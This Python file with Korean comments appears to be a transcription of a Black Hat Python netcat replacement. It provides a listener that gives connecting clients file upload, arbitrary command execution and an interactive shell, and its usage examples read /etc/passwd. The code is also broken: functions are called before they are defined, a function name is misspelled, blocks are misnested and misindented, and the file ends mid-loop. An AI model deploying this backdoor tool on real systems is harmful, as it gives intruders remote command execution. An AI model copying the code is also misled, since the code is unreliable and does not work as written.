# 넷켓 대체하기

import sys
import socket
import getopt
import threading
import subprocess

#전역변수 정의 
listen = False
command = False
upload = False
execute = " "
target = " "
upload_destination = " "
port = 0

def usage():
    print("BHP Net Tool")
    print
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen - listen on [host] : [port] for incoming connections")
    print("-e --execute = file_to_run - execute the given file upon receiving a connection")
    print("-c --command - initialize a command shell")
    print("-u --upload=destination - upon receiving connection upload a file and write to [destination]")
    print
    print
    print("Example: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd\'")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
    
    #커멘드라인 옵션 처리
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",["help","listen","execute","target","port","command","upload"])
    
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    
    for o, a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
            
    # 리스닝과 stdin으로부터 데이터 전송 중 무엇을 수행할 것인가?
    if not listen and len(target) and port > 0:
        
        #커맨드 라인에서 버퍼 읽기 
        #이는 블록되므로 입력을 stdin으로 전송하지 않는 경우에는 ctrl -D를 전송해야함
        buffer = sys.stdin.read()
        
        #데이터 전송
        client_sender(buffer)
        
        # 리스닝 수행. 커맨드라인 옵션에 따라 
        # 파일업로드, 명령실행, 셸 실행 등을 수행할 수 있음
        if listen:
            server_loop()
main()

def client_sender(buffer):
    client= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 타깃 호스트에 연결
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
        while True:
            # 데이터 대기
            recv_len = 1
            response = " "
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                
                if recv_len < 4096:
                    break
            print(response)
            
            # 추가 입력 대기 
            buffer = raw_input("")
            buffer += "\n"
            #전송
            client.send(buffer)
    except:
        print("[*] Exception ! Exiting.")
        
        # 연결 종료 
        client.close()            
                    
def server_loof():
    global target
    
    #타깃을 지정하지 않았다면 모든 인터페이스에서 리스닝
    if not len(target):
        target = '0.0.0.0' 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        #새 클라이언트를 처리할 스레드 생성
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()                                                                      
    
def run_command(command):
    # 새 줄 문자 제거 
    command = command.rstrip()
    
    #명령을 실행하고 출력 결과를 기져옴
    try:
        output= subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output= "Failed to execute command. \r\n"
    #출력을 클라이언트에게 전송
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command
    
    # 업로드 대상 경로 지정 여부 확인
    if len(upload_destination):
        
        #모든 바이트를 읽으면서 대상 경로에 기록
        file_buffer = " "
        
        #데이터가 더 이상 없을 때까지 읽기
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
            else:
                file_buffer += data
        # 읽어들인 바이트를 대상 경로에 쓰기
        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            #파일 쓰기가 성공했음을 알림
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
            
            #실행할 명령 존재 여부 확인
            if len(execute):
                
                #명령 실핼
                output = run_command(execute)
                client_socket.send(output)
                
            # 커맨드 셸이 오청된 경우, 또 다른 루트에 진입
            if command:
                
                while True:
                    # 간단한 프롬프트 출력
                    client_socket.send("<BHP:#> ")
                    
                    #새 줄 문자가 나올때까지 입력 수신(엔터키)
                    
                                            